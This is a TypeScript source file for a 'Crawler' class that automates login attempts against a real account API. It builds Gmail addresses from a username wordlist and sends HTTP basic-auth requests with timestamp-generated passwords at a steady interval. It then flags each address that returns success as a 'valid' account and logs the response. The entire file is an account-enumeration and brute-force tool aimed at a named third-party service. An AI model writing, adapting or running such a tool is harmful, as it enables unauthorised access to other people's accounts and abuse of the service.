import axios from "axios";
import EventEmitter from "events";

export class Crawler {
  constructor() {}

  found = 0;
  emailEvents = new EventEmitter();
  genAuthorization = (): string => {
    const timestamp = Date.now();
    return `${timestamp}`;
  };
  timeout = (ms: number) => {
    return new Promise((resolve) => setTimeout(resolve, ms));
  };
  request = async (email: string, password: string) => {
    const url = "https://api.stemplayer.com/accounts/access";
    axios
      .get(url, {
        auth: { username: email, password: password },
      })
      .then((res) => {
        if (res.status === 200) {
          this.emailEvents.emit("valid-found", email);
          this.found++;
          console.log(res);
        }
      })
      .catch((e) => {});
  };
  crawl = async (wordlist: string[], limit: number) => {
    const emails = wordlist.map((username) => {
      return `${username}@gmail.com`;
    });

    for (const email of emails) {
      await this.timeout(350);
      const pwd = this.genAuthorization();
      this.emailEvents.emit("trying", email);
      this.request(email, pwd);
      if (this.found >= limit) {
        this.found = 0;
        this.emailEvents.emit("done");
        break;
      }
    }
  };
}
